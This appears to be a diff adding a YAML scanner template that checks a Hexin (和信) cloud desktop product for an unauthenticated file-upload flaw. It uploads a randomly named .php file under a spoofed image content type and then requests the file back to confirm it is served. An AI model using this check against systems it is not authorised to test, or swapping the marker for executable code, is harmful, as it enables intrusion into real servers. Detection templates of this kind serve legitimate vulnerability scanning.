@@ -1,0 +1,26 @@
+name: 和信云桌面upload
+set:
+  r1: randomInt(10000, 99999)
+  r2: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Upload/upload_file.php?l=test
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv 
+      body: "\
+        ------WebKitFormBoundaryfcKRltGv\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php\"\r\n\
+        Content-Type: image/avif\r\n\
+        \r\n\
+        {{r2}}\r\n\
+        ------WebKitFormBoundaryfcKRltGv--\r\n\
+        "
+    expression: response.status == 200 && response.body.bcontains(b'_Requst:<br>')
+  r1:
+    request:
+      method: GET
+      path: /Upload/test/{{r1}}.php
+    expression: response.status == 200 && response.body.bcontains(bytes(r2))
+expression: r0() && r1()
